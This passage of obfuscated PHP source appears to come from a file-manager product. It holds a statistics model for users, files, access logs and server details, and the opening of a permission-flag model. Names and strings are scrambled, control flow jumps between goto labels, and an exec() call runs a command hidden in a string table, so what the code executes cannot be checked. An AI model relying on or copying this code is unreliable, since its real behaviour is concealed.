$_SERVER[Šº]; $DÁ¿É–”® = array($D–¥ ôì[570] => array($D–¥ ôì[29] => $D–¥ ôì[1603], $D–¥ ôì[270] => array($D–¥ ôì[221], $D–¥ ôì[723], $D–¥ ôì[1604], $D–¥ ôì[1605])), $D–¥ ôì[1606] => array($D–¥ ôì[29] => $D–¥ ôì[1607], $D–¥ ôì[270] => array($D–¥ ôì[221], $D–¥ ôì[721], $D–¥ ôì[1608], $D–¥ ôì[1609], $D–¥ ôì[1610]))); if (!isset($DÁ¿É–”®[$BŒ×ŸŞ„Ù¾])) { return !1; } $this->optionType = $DÁ¿É–”®[$BŒ×ŸŞ„Ù¾][$D–¥ ôì[29]]; $this->field = $DÁ¿É–”®[$BŒ×ŸŞ„Ù¾][$D–¥ ôì[270]]; return !0; } public function listData($fËŒÏ‚¤±ö = false, $f¤ò¯×‰ í = "\155\157\x64\x69\x66\171\124\151\x6d\x65", $c´õº¾Õ¥Á = false) { return parent::listData($fËŒÏ‚¤±ö, $f¤ò¯×‰ í, $c´õº¾Õ¥Á); } public function trendList($F†İÑ‚æÆ) { goto dİ¨µ¸ö§; dİ¨µ¸ö§: $BãËƒŸéî =& $_SERVER[Šº]; $e¬‡Çä½Š´ = $this->listData(); if ($e¬‡Çä½Š´) { $d“Âéµ‘‡ = end($e¬‡Çä½Š´); $báä¿ºê§ = date($BãËƒŸéî[1611], strtotime($BãËƒŸéî[1612])); if ($d“Âéµ‘‡[$BãËƒŸéî[221]] == $báä¿ºê§) { return $e¬‡Çä½Š´; } $a‡È„†ãê = strtotime($d“Âéµ‘‡[$BãËƒŸéî[221]]); } goto C±‘ê´½õŠ; Bˆ™…êÃôÅ: foreach ($F¹Í¨éŒ£ as $báä¿ºê§) { $this->{$CÎ¦É¬ÑÚö}($báä¿ºê§); } return $this->listData(); goto aÔ˜Š´öÆ¼; C±‘ê´½õŠ: if (!isset($a‡È„†ãê)) { $Aº¾ÊŸ­½… = $F†İÑ‚æÆ == $BãËƒŸéî[570] ? $BãËƒŸéî[514] : $BãËƒŸéî[788]; $a‡È„†ãê = Model($Aº¾ÊŸ­½…)->min($BãËƒŸéî[193]); } $CÎ¦É¬ÑÚö = $BãËƒŸéî[1613] . ucfirst($F†İÑ‚æÆ); $F¹Í¨éŒ£ = $this->dateList($a‡È„†ãê); goto Bˆ™…êÃôÅ; aÔ˜Š´öÆ¼: } private function dateList($f‚Û¦‹ùÈ) { $eœñº†Á‡Ã =& $_SERVER[Šº]; $e³½ø“ìé¢ = $f‚Û¦‹ùÈ; $dèà¬àÄ³± = strtotime($eœñº†Á‡Ã[1612]); $fï¥äÉ¢í = array(); while ($e³½ø“ìé¢ <= $dèà¬àÄ³±) { $fï¥äÉ¢í[] = date($eœñº†Á‡Ã[1611], $e³½ø“ìé¢); $e³½ø“ìé¢ = strtotime($eœñº†Á‡Ã[1614], $e³½ø“ìé¢); } return $fï¥äÉ¢í; } public function _recordUser($a×¤¨É½„á = '') { goto C…ÕÎÈŒœ; C…ÕÎÈŒœ: $CŒÇÔ°Ôë» =& $_SERVER[Šº]; $d…ÓñáÂˆ• = strtotime(date($CŒÇÔ°Ôë»[1615], strtotime($a×¤¨É½„á))); $Få¿ä÷° = strtotime(date($CŒÇÔ°Ôë»[1616], strtotime($a×¤¨É½„á))); goto D¼Óâ„¥‘—; B¯šâ¦Äì—: $DÄÛø­Š½ƒ = array($CŒÇÔ°Ôë»[221] => $a×¤¨É½„á, $CŒÇÔ°Ôë»[723] => (int) $EÁĞ´˜‘èì, $CŒÇÔ°Ôë»[1604] => (int) $cˆ×ï¡ê¸¹, $CŒÇÔ°Ôë»[1605] => (int) $D˜Û¸ ¥Üø); return $this->insert($DÄÛø­Š½ƒ); goto Fê”Í¬¥; fœË†‹å§ˆ: $cˆ×ï¡ê¸¹ = Model($CŒÇÔ°Ôë»[514])->where($Aãçä‰º)->count($CŒÇÔ°Ôë»[1514]); $Aãçä‰º[$CŒÇÔ°Ôë»[29]] = $CŒÇÔ°Ôë»[1617]; $D˜Û¸ ¥Üø = Model($CŒÇÔ°Ôë»[1618])->where($Aãçä‰º)->count($CŒÇÔ°Ôë»[1619]); goto B¯šâ¦Äì—; D¼Óâ„¥‘—: $Aãçä‰º = array($CŒÇÔ°Ôë»[193] => array($CŒÇÔ°Ôë»[958], $Få¿ä÷°)); $EÁĞ´˜‘èì = Model($CŒÇÔ°Ôë»[514])->where($Aãçä‰º)->count($CŒÇÔ°Ôë»[1514]); $Aãçä‰º[$CŒÇÔ°Ôë»[193]] = array($CŒÇÔ°Ôë»[330], array($d…ÓñáÂˆ•, $Få¿ä÷°)); goto fœË†‹å§ˆ; Fê”Í¬¥: } public function _recordStore($Fó®íÑÎ = '') { goto a›ÉÔÅ“¼; D”…åÀ§ª: $fäÜÇ…›Ø = Model($d¼™ÕÀ…ï±[788])->where($aÖùáğ¯ïò)->sum($d¼™ÕÀ…ï±[78]); $bìõ–§ù©å = array($d¼™ÕÀ…ï±[221] => $Fó®íÑÎ, $d¼™ÕÀ…ï±[721] => (int) $b±¨„°²ƒ‘, $d¼™ÕÀ…ï±[1608] => (int) $Fñâ”Ìâí, $d¼™ÕÀ…ï±[1609] => (int) $FÛ¦İáÆ§ó, $d¼™ÕÀ…ï±[1610] => (int) $fäÜÇ…›Ø); return $this->insert($bìõ–§ù©å); goto BªË¶»ã¹­; a›ÉÔÅ“¼: $d¼™ÕÀ…ï± =& $_SERVER[Šº]; $EÈ§›·á´Í = strtotime(date($d¼™ÕÀ…ï±[1616], strtotime($Fó®íÑÎ))); $aÖùáğ¯ïò = array($d¼™ÕÀ…ï±[193] => array($d¼™ÕÀ…ï±[958], $EÈ§›·á´Í)); goto eİµóÁ‚º; D××°‘ó¦: $aÖùáğ¯ïò[$d¼™ÕÀ…ï±[411]] = 1; $FÛ¦İáÆ§ó = Model($d¼™ÕÀ…ï±[788])->where($aÖùáğ¯ïò)->sum($d¼™ÕÀ…ï±[78]); $aÖùáğ¯ïò[$d¼™ÕÀ…ï±[411]] = 2; goto D”…åÀ§ª; eİµóÁ‚º: $Fñâ”Ìâí = Model($d¼™ÕÀ…ï±[457])->where($aÖùáğ¯ïò)->sum($d¼™ÕÀ…ï±[78]); $aÖùáğ¯ïò[$d¼™ÕÀ…ï±[410]] = 0; $b±¨„°²ƒ‘ = Model($d¼™ÕÀ…ï±[788])->where($aÖùáğ¯ïò)->sum($d¼™ÕÀ…ï±[78]); goto D××°‘ó¦; BªË¶»ã¹­: } public function trend($dò¿÷¸Æ™´, $a´Ø¼î¿éŞ) { goto AÂ¡ä¡â«š; c˜œº§Œêì: if (empty($CƒŸç©é«¥)) { $a²Ş§Ã‹¬… = date($côßµ”…Üñ[1611], strtotime($côßµ”…Üñ[1612])); $EÇ¶ŞÏ¾¹á = array($côßµ”…Üñ[221] => $a²Ş§Ã‹¬…); foreach ($EõÉøä«ˆß[$dò¿÷¸Æ™´] as $Aå¢ïºßõ => $bÍ±èˆĞãä) { $EÇ¶ŞÏ¾¹á[$Aå¢ïºßõ] = 0; } $CƒŸç©é«¥[] = $EÇ¶ŞÏ¾¹á; } $fåš¹¨ŒÅ = array(); foreach ($CƒŸç©é«¥ as $bÍ±èˆĞãä) { if ($dò¿÷¸Æ™´ == $côßµ”…Üñ[1606] && $bÍ±èˆĞãä[$côßµ”…Üñ[1608]] > $bÍ±èˆĞãä[$côßµ”…Üñ[721]]) { $bÍ±èˆĞãä[$côßµ”…Üñ[1608]] = $bÍ±èˆĞãä[$côßµ”…Üñ[721]]; } foreach ($EõÉøä«ˆß[$dò¿÷¸Æ™´] as $Aå¢ïºßõ => $bŒ¸˜»™Í) { $dİ·Ô¤Ï¾Å = array($côßµ”…Üñ[221] => $bÍ±èˆĞãä[$côßµ”…Üñ[221]], $côßµ”…Üñ[1420] => $bŒ¸˜»™Í); $dİ·Ô¤Ï¾Å[$f¨áÒÙéÊ‘[$dò¿÷¸Æ™´]] = isset($bÍ±èˆĞãä[$Aå¢ïºßõ]) ? $bÍ±èˆĞãä[$Aå¢ïºßõ] : 0; $fåš¹¨ŒÅ[] = $dİ·Ô¤Ï¾Å; } } goto c…—öò–ÒÅ; c…—öò–ÒÅ: return $fåš¹¨ŒÅ; goto EŒ­ˆ‘µ•¸; Cöä‚‚ŒË: if ($CƒŸç©é«¥ && $a´Ø¼î¿éŞ != $côßµ”…Üñ[1488]) { $bÌ•‘Ø×¶ = $CƒŸç©é«¥[0][$côßµ”…Üñ[221]]; $a¯­øÃË»· = $this->validDate($a´Ø¼î¿éŞ, $bÌ•‘Ø×¶); $Cöº¬Ø™ë = array(); $fÇñÆè•Ö² = array_to_keyvalue($CƒŸç©é«¥, $côßµ”…Üñ[221]); foreach ($a¯­øÃË»· as $a²Ş§Ã‹¬…) { if (isset($fÇñÆè•Ö²[$a²Ş§Ã‹¬…])) { $dİ·Ô¤Ï¾Å = $fÇñÆè•Ö²[$a²Ş§Ã‹¬…]; } else { $dİ·Ô¤Ï¾Å = end($CƒŸç©é«¥); $dİ·Ô¤Ï¾Å[$côßµ”…Üñ[221]] = $a²Ş§Ã‹¬…; if ($dò¿÷¸Æ™´ == $côßµ”…Üñ[570]) { $dİ·Ô¤Ï¾Å[$côßµ”…Üñ[1604]] = $dİ·Ô¤Ï¾Å[$côßµ”…Üñ[1605]] = 0; } } $Cöº¬Ø™ë[] = $dİ·Ô¤Ï¾Å; } $CƒŸç©é«¥ = $Cöº¬Ø™ë; } $EõÉøä«ˆß = array($côßµ”…Üñ[570] => array($côßµ”…Üñ[723] => LNG($côßµ”…Üñ[1620]), $côßµ”…Üñ[1604] => LNG($côßµ”…Üñ[1621]), $côßµ”…Üñ[1605] => LNG($côßµ”…Üñ[1622])), $côßµ”…Üñ[1606] => array($côßµ”…Üñ[721] => LNG($côßµ”…Üñ[1623]), $côßµ”…Üñ[1608] => LNG($côßµ”…Üñ[1624]), $côßµ”…Üñ[1609] => LNG($côßµ”…Üñ[1625]), $côßµ”…Üñ[1610] => LNG($côßµ”…Üñ[1626]))); $f¨áÒÙéÊ‘ = array($côßµ”…Üñ[570] => $côßµ”…Üñ[1627], $côßµ”…Üñ[1606] => $côßµ”…Üñ[78]); goto c˜œº§Œêì; AÂ¡ä¡â«š: $côßµ”…Üñ =& $_SERVER[Šº]; if (!$this->init($dò¿÷¸Æ™´)) { return !1; } $CƒŸç©é«¥ = $this->trendList($dò¿÷¸Æ™´); goto Cöä‚‚ŒË; EŒ­ˆ‘µ•¸: } public function validDate($eñ‚–Œ´ê, $cÇ–éŒ†Õ) { goto BÅÑÉóÙ•®; EëÉÌ…™Šª: return $CÃëˆ‰­ŒØ; goto DÌªŠ§©©·; c‰ƒ‹§äÛ˜: switch ($eñ‚–Œ´ê) { case $DÕ§Ï‹‡¿[1495]: $d³´ˆ¦†ÖŸ = mktime(0, 0, 0, date($DÕ§Ï‹‡¿[1628]), date($DÕ§Ï‹‡¿[1239]) - date($DÕ§Ï‹‡¿[1302]) + 7 - 7, date($DÕ§Ï‹‡¿[1629])); $eæÁ¥›½Ë¢ = 0; do { $EœµÌ»øŒ = date($DÕ§Ï‹‡¿[1611], $d³´ˆ¦†ÖŸ - 3600 * 24 * 7 * $eæÁ¥›½Ë¢); $CÃëˆ‰­ŒØ[] = $EœµÌ»øŒ; $eæÁ¥›½Ë¢++; } while ($cÇ–éŒ†Õ < $EœµÌ»øŒ); break; case $DÕ§Ï‹‡¿[1493]: $eæÁ¥›½Ë¢ = 1; do { $dí¡ŒÕˆÂ = date($DÕ§Ï‹‡¿[1630], strtotime("\55\40{$eæÁ¥›½Ë¢}\x20\x6d\157\156\x74\150\163")); $CÃëˆ‰­ŒØ[] = $dí¡ŒÕˆÂ; $eæÁ¥›½Ë¢++; } while ($cÇ–éŒ†Õ < $dí¡ŒÕˆÂ); break; case $DÕ§Ï‹‡¿[1631]: $a„ÆÒÁé‡ = (int) date($DÕ§Ï‹‡¿[1629], strtotime($cÇ–éŒ†Õ)); $b†„ÜÌö“Æ = (int) date($DÕ§Ï‹‡¿[1629]); if ($a„ÆÒÁé‡ >= $b†„ÜÌö“Æ) { break; } for ($a„ÆÒÁé‡; $a„ÆÒÁé‡ < $b†„ÜÌö“Æ; $a„ÆÒÁé‡++) { $CÃëˆ‰­ŒØ[] = $a„ÆÒÁé‡ . $DÕ§Ï‹‡¿[1632]; } break; default: break; } if ($cÇ–éŒ†Õ > end($CÃëˆ‰­ŒØ)) { array_pop($CÃëˆ‰­ŒØ); } sort($CÃëˆ‰­ŒØ); goto EëÉÌ…™Šª; BÅÑÉóÙ•®: $DÕ§Ï‹‡¿ =& $_SERVER[Šº]; $bÀ¢ù§ÁË‹ = date($DÕ§Ï‹‡¿[1611], strtotime($DÕ§Ï‹‡¿[1612])); $CÃëˆ‰­ŒØ = array($bÀ¢ù§ÁË‹); goto c‰ƒ‹§äÛ˜; DÌªŠ§©©·: } public function listTable($c‡Ğ¬ÇÊì) { $aæâƒƒ‰‚ = ucfirst($c‡Ğ¬ÇÊì); return Model($aæâƒƒ‰‚)->listData(); } public function option($a¾ŸÁæ¬©) { $Aôö‰¼‰Ğ = $_SERVER[Šº][1633] . ucfirst($a¾ŸÁæ¬©); return $this->{$Aôö‰¼‰Ğ}(); } private function optionUser() { goto C™À½§´; FÖŒ„‚‹¨Ä: return array($a¾Î™İÛ¦—[717] => (int) $c£¬æ”ŠÏ‹, $a¾Î™İÛ¦—[1636] => (int) ($c£¬æ”ŠÏ‹ - $B“‡‡øñÃå), $a¾Î™İÛ¦—[1637] => (int) $B“‡‡øñÃå, $a¾Î™İÛ¦—[1638] => (int) $cåï†…™¯, $a¾Î™İÛ¦—[1639] => $e ï”¬’£Á); goto EŒâãŞ™Á ; EÃ»ÎÆ›‚•: if (!$e ï”¬’£Á) { $e ï”¬’£Á = 1; } $dÍÏì¤Àè’ = array($a¾Î™İÛ¦—[1635] => array($a¾Î™İÛ¦—[959], $C•Ó‹¤İÚ¿)); $cåï†…™¯ = Model($a¾Î™İÛ¦—[514])->where($dÍÏì¤Àè’)->count($a¾Î™İÛ¦—[1514]); goto FÖŒ„‚‹¨Ä; D¿¢ÔÌİâÏ: $aîÀ”«À¡ò = intval($GLOBALS[$a¾Î™İÛ¦—[6]][$a¾Î™İÛ¦—[346]][$a¾Î™İÛ¦—[1474]]) / 3600; $aõö†“¢Ğ = strtotime("\x2d{$aîÀ”«À¡ò}\x20\150\157\165\162\x73"); $C•Ó‹¤İÚ¿ = strtotime(date($a¾Î™İÛ¦—[1615])); goto D¥áæš¾£¾; C™À½§´: $a¾Î™İÛ¦— =& $_SERVER[Šº]; $c£¬æ”ŠÏ‹ = Model($a¾Î™İÛ¦—[514])->count($a¾Î™İÛ¦—[1514]); $B“‡‡øñÃå = Model($a¾Î™İÛ¦—[514])->where($a¾Î™İÛ¦—[1634])->count($a¾Î™İÛ¦—[1514]); goto D¿¢ÔÌİâÏ; D¥áæš¾£¾: if ($aõö†“¢Ğ < $C•Ó‹¤İÚ¿) { $aõö†“¢Ğ = $C•Ó‹¤İÚ¿; } $dÍÏì¤Àè’ = array($a¾Î™İÛ¦—[1635] => array($a¾Î™İÛ¦—[959], $aõö†“¢Ğ)); $e ï”¬’£Á = (int) Model($a¾Î™İÛ¦—[514])->where($dÍÏì¤Àè’)->count($a¾Î™İÛ¦—[1514]); goto EÃ»ÎÆ›‚•; EŒâãŞ™Á : } private function optionFile() { goto e†¨öÎñÒØ; e†¨öÎñÒØ: $bîÊÄ÷À¦ =& $_SERVER[Šº]; $d²ÇâŸğ” = $this->sourceSize(); $CœŒ„„¸âã = $d²ÇâŸğ”[$bîÊÄ÷À¦[78]]; goto B‰·¸±ğ·; B‰·¸±ğ·: $dºÍÚØ¤°÷ = $d²ÇâŸğ”[$bîÊÄ÷À¦[1608]]; $bÎ…Ë¦Ÿº’ = Model($bîÊÄ÷À¦[788])->where(array($bîÊÄ÷À¦[410] => 0))->count($bîÊÄ÷À¦[403]); $f¤‹¤¤Óƒ¶ = array($bîÊÄ÷À¦[410] => 0, $bîÊÄ÷À¦[193] => array($bîÊÄ÷À¦[959], strtotime(date($bîÊÄ÷À¦[1615])))); goto B¶ñ÷‚ğğî; B¶ñ÷‚ğğî: $EÈˆŞ§ğ¥ = Model($bîÊÄ÷À¦[788])->where($f¤‹¤¤Óƒ¶)->sum($bîÊÄ÷À¦[78]); $Aß†¶«Ã·ñ = Model($bîÊÄ÷À¦[788])->where($f¤‹¤¤Óƒ¶)->count($bîÊÄ÷À¦[403]); return array($bîÊÄ÷À¦[721] => $CœŒ„„¸âã, $bîÊÄ÷À¦[1608] => $dºÍÚØ¤°÷, $bîÊÄ÷À¦[1640] => $CœŒ„„¸âã - $dºÍÚØ¤°÷, $bîÊÄ÷À¦[1641] => (int) $EÈˆŞ§ğ¥, $bîÊÄ÷À¦[723] => (int) $bÎ…Ë¦Ÿº’, $bîÊÄ÷À¦[1642] => (int) $Aß†¶«Ã·ñ); goto D—íñ¨Ê‰å; D—íñ¨Ê‰å: } private function optionAccess() { $AƒÛ½òíİ =& $_SERVER[Šº]; return array($AƒÛ½òíİ[717] => $this->typeLogCnt(), $AƒÛ½òíİ[107] => $this->typeLogCnt($AƒÛ½òíİ[107]), $AƒÛ½òíİ[437] => $this->typeLogCnt($AƒÛ½òíİ[437]), $AƒÛ½òíİ[1643] => $this->typeLogCnt($AƒÛ½òíİ[1643]), $AƒÛ½òíİ[1644] => $this->typeLogCnt($AƒÛ½òíİ[1644]), $AƒÛ½òíİ[570] => $this->typeLogCnt($AƒÛ½òíİ[33], $AƒÛ½òíİ[1619])); } private function typeLogCnt($Bô‚Æè’äà = '', $a‘ùöî– = "\x69\144") { goto a®‹‚ïöóš; FŒ“ğÛÀÏ: return (int) $FÂÎ«Å†¨Ö; goto F›‚ÈÈ¦Õ²; a®‹‚ïöóš: $C±•ÛùÖƒ‚ =& $_SERVER[Šº]; $c‚í¦ï © = array($C±•ÛùÖƒ‚[107] => array($C±•ÛùÖƒ‚[1645], $C±•ÛùÖƒ‚[1646]), $C±•ÛùÖƒ‚[437] => array($C±•ÛùÖƒ‚[1647], $C±•ÛùÖƒ‚[1648]), $C±•ÛùÖƒ‚[1643] => array($C±•ÛùÖƒ‚[1649], $C±•ÛùÖƒ‚[1650], $C±•ÛùÖƒ‚[1651]), $C±•ÛùÖƒ‚[1644] => array($C±•ÛùÖƒ‚[1652], $C±•ÛùÖƒ‚[1653]), $C±•ÛùÖƒ‚[1654] => array($C±•ÛùÖƒ‚[1655], $C±•ÛùÖƒ‚[1656], $C±•ÛùÖƒ‚[1657])); $e§Œ‡ÊÉ«Ò = strtotime(date($C±•ÛùÖƒ‚[1615])); goto c„¶á„ëŠ¬; c„¶á„ëŠ¬: $cİ¡êø¬í» = array($C±•ÛùÖƒ‚[193] => array($C±•ÛùÖƒ‚[959], $e§Œ‡ÊÉ«Ò)); if ($Bô‚Æè’äà) { $cİ¡êø¬í»[$C±•ÛùÖƒ‚[29]] = array($C±•ÛùÖƒ‚[7], $c‚í¦ï ©[$Bô‚Æè’äà]); } $FÂÎ«Å†¨Ö = Model($C±•ÛùÖƒ‚[1618])->where($cİ¡êø¬í»)->count($a‘ùöî–); goto FŒ“ğÛÀÏ; F›‚ÈÈ¦Õ²: } private function optionServer() { goto aİ´“Áå§İ; aİ´“Áå§İ: $FŸù’÷ªø =& $_SERVER[Šº]; $f’í²²ãÚ = $this->diskDriver(); $fËˆ®Á­ = KodIO::defaultDriver(); goto f®Ç¬ä¼ÎÑ; bØóàÍÁ½ë: $C‰‡“Öšğ÷ = $FóÆ¤¼”ÄŠ[0]; $eÜç‹Ê´¶ğ = $GLOBALS[$FŸù’÷ªø[6]][$FŸù’÷ªø[17]]; $eÉçâï‘±ä = $eÜç‹Ê´¶ğ[$FŸù’÷ªø[920]]; goto DÖ—øí«Ş¼; DÖ—øí«Ş¼: if ($eÉçâï‘±ä == $FŸù’÷ªø[753]) { $f ‡¹ˆ½ÓÅ = explode($FŸù’÷ªø[1153], $eÜç‹Ê´¶ğ[$FŸù’÷ªø[919]]); $eÉçâï‘±ä = $f ‡¹ˆ½ÓÅ[0]; } if ($eÉçâï‘±ä == $FŸù’÷ªø[756] || $eÉçâï‘±ä == $FŸù’÷ªø[757]) { $fš¡ù„šğï = Model()->db()->query($FŸù’÷ªø[1658]); $Aô²Ä‹åÖ = $fš¡ù„šğï[0] && isset($fš¡ù„šğï[0][$FŸù’÷ªø[1419]]) ? $fš¡ù„šğï[0][$FŸù’÷ªø[1419]] : 0; $eÉçâï‘±ä = $FŸù’÷ªø[1659] . ($Aô²Ä‹åÖ ? $FŸù’÷ªø[8] . $Aô²Ä‹åÖ : $FŸù’÷ªø[33]); } $D×ñÚÔ—ç” = $GLOBALS[$FŸù’÷ªø[6]][$FŸù’÷ªø[346]][$FŸù’÷ªø[790]]; goto e¬ê®óø±©; e¬ê®óø±©: return array($FŸù’÷ªø[1660] => $f’í²²ãÚ ? $f’í²²ãÚ[$FŸù’÷ªø[1661]] : 0, $FŸù’÷ªø[1662] => $f’í²²ãÚ ? $f’í²²ãÚ[$FŸù’÷ªø[1663]] : 0, $FŸù’÷ªø[1664] => (int) $fËˆ®Á­[$FŸù’÷ªø[1661]] * 1024 * 1024 * 1024, $FŸù’÷ªø[1665] => (int) $Díö’æµ, $FŸù’÷ªø[1666] => ucfirst($C‰‡“Öšğ÷), $FŸù’÷ªø[1667] => $FŸù’÷ªø[1668] . PHP_VERSION, $FŸù’÷ªø[1669] => phpBuild64() ? 64 : 32, $FŸù’÷ªø[716] => str_replace($FŸù’÷ªø[1670], $FŸù’÷ªø[936], $eÉçâï‘±ä), $FŸù’÷ªø[346] => ucfirst($D×ñÚÔ—ç”), $FŸù’÷ªø[28] => $_SERVER[$FŸù’÷ªø[1671]]); goto FÛ…ÖÃ–½¥; f®Ç¬ä¼ÎÑ: $BíĞ“ö˜¡ = array($FŸù’÷ªø[780] => $fËˆ®Á­[$FŸù’÷ªø[392]]); $Díö’æµ = Model($FŸù’÷ªø[457])->where($BíĞ“ö˜¡)->sum($FŸù’÷ªø[78]); $FóÆ¤¼”ÄŠ = explode($FŸù’÷ªø[50], $_SERVER[$FŸù’÷ªø[142]]); goto bØóàÍÁ½ë; FÛ…ÖÃ–½¥: } private function diskDriver() { goto bé…ÌÆ¹; fÑå¾ƒôÏå: if ($Fô§µµ‘÷Ş) { $CŞ…ÂéĞÍ‰ = $f¶‚»Ñ‚³[1674]; if (function_exists($f¶‚»Ñ‚³[1675])) { exec($f¶‚»Ñ‚³[1676], $C™ùÎ’ÂÊö); $CŞ…ÂéĞÍ‰ = $C™ùÎ’ÂÊö[1] . $f¶‚»Ñ‚³[8]; } } if (!file_exists($CŞ…ÂéĞÍ‰)) { return; } $B©ï­á‰²á = @disk_total_space($CŞ…ÂéĞÍ‰); goto DÙå‰ááô÷; DÙå‰ááô÷: $a§Áˆ“Ôˆ± = $B©ï­á‰²á - @disk_free_space($CŞ…ÂéĞÍ‰); return array($f¶‚»Ñ‚³[1661] => $B©ï­á‰²á, $f¶‚»Ñ‚³[1663] => $a§Áˆ“Ôˆ±); goto DèÊß¯¤‡; bé…ÌÆ¹: $f¶‚»Ñ‚³ =& $_SERVER[Šº]; $CŞ…ÂéĞÍ‰ = $f¶‚»Ñ‚³[8]; $Fô§µµ‘÷Ş = $GLOBALS[$f¶‚»Ñ‚³[6]][$f¶‚»Ñ‚³[1672]] == $f¶‚»Ñ‚³[1673]; goto fÑå¾ƒôÏå; DèÊß¯¤‡: } public function fileChart($bŠğ½Ğ‡) { goto C à–’Æî; C à–’Æî: $b¨ÓÙÕƒÄ =& $_SERVER[Šº]; if (isset($bŠğ½Ğ‡[$b¨ÓÙÕƒÄ[1514]])) { return Model($b¨ÓÙÕƒÄ[788])->userFileTypeProfile($bŠğ½Ğ‡[$b¨ÓÙÕƒÄ[1514]]); } if (isset($bŠğ½Ğ‡[$b¨ÓÙÕƒÄ[1677]])) { return Model($b¨ÓÙÕƒÄ[788])->groupFileTypeProfile($bŠğ½Ğ‡[$b¨ÓÙÕƒÄ[1677]]); } goto D…ßÍ›İŸ¹; e­‹÷ÖÔ: $C—ŠØæÑ§£[$b¨ÓÙÕƒÄ[411]] = 2; $D´¸ÑîôĞ« = Model($b¨ÓÙÕƒÄ[788])->where($C—ŠØæÑ§£)->sum($b¨ÓÙÕƒÄ[78]); return array($b¨ÓÙÕƒÄ[721] => $dåÉåÉ½»[$b¨ÓÙÕƒÄ[78]], $b¨ÓÙÕƒÄ[1608] => $dåÉåÉ½»[$b¨ÓÙÕƒÄ[1608]], $b¨ÓÙÕƒÄ[1609] => (int) $EÍº·ĞæÚ, $b¨ÓÙÕƒÄ[1610] => (int) $D´¸ÑîôĞ«); goto EÓŠ†ãŒæ’; D…ßÍ›İŸ¹: $dåÉåÉ½» = $this->sourceSize(); $C—ŠØæÑ§£ = array($b¨ÓÙÕƒÄ[485] => 0, $b¨ÓÙÕƒÄ[411] => 1); $EÍº·ĞæÚ = Model($b¨ÓÙÕƒÄ[788])->where($C—ŠØæÑ§£)->sum($b¨ÓÙÕƒÄ[78]); goto e­‹÷ÖÔ; EÓŠ†ãŒæ’: } private function sourceSize() { $döîº°—Æ‚ =& $_SERVER[Šº]; $bø’¼Š¡ŒÙ = Model($döîº°—Æ‚[788])->where(array($döîº°—Æ‚[410] => 0))->sum($döîº°—Æ‚[78]); $F¯à“ñíà = Model($döîº°—Æ‚[457])->sum($döîº°—Æ‚[78]); if ($F¯à“ñíà > $bø’¼Š¡ŒÙ) { $F¯à“ñíà = $bø’¼Š¡ŒÙ; } return array($döîº°—Æ‚[78] => (int) $bø’¼Š¡ŒÙ, $döîº°—Æ‚[1608] => (int) $F¯à“ñíà); } } class AuthModel extends ModelBaseLight { const AUTH_SHOW = 1; const AUTH_VIEW = 2; const AUTH_DOWNLOAD = 4; const AUTH_UPLOAD = 8; const AUTH_EDIT = 16; const AUTH_REMOVE = 32; const AUTH_SHARE = 64; const AUTH_COMMENT = 128; const AUTH_EVENT = 256; const AUTH_ROOT = 33554432; public static function authAll() { return self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT; } public static function authDefault() { $Fã´‡É¯šÎ =& $_SERVER[Šº]; $AÈÈÓÑˆÁÓ = array(array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1678]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1680], $Fã´‡É¯šÎ[1681] => 1, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1684]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1685], $Fã´‡É¯šÎ[1681] => 2, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1686]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1687], $Fã´‡É¯šÎ[1681] => 3, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_COMMENT | self::AUTH_EVENT), array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1688]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1689], $Fã´‡É¯šÎ[1681] => 4, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => self::AUTH_SHOW | self::AUTH_VIEW), array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1690]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1691], $Fã´‡É¯šÎ[1681] => 5, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => self::AUTH_SHOW | self::AUTH_UPLOAD), array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1692]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1693], $Fã´‡É¯šÎ[1681] => 6, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => self::AUTH_SHOW | self::AUTH_VIEW | self::AUTH_DOWNLOAD | self::AUTH_UPLOAD | self::AUTH_EDIT | self::AUTH_REMOVE | self::AUTH_SHARE | self::AUTH_COMMENT | self::AUTH_EVENT | self::AUTH_ROOT), array($Fã´‡É¯šÎ[420] => LNG($Fã´‡É¯šÎ[1694]), $Fã´‡É¯šÎ[1679] => $Fã´‡É¯šÎ[1695], $Fã´‡É¯šÎ[1681] => 7, $Fã´‡É¯šÎ[1682] => 1, $Fã´‡É¯šÎ[1683] => 0)); return $AÈÈÓÑˆÁÓ; } public static function authCheck($cÛÛ÷ëò–, $aŸ†öš©Éù) { $cÛÛ÷ëò– = intval($cÛÛ÷ëò–); if ($GLOBALS[$_SERVER[Šº][492]]) { return !0; } if ($cÛÛ÷ëò– <= 0) { return !1; } if (($cÛÛ÷ëò– & self::AUTH_ROOT) == self::AUTH_ROOT) { return !0; } return 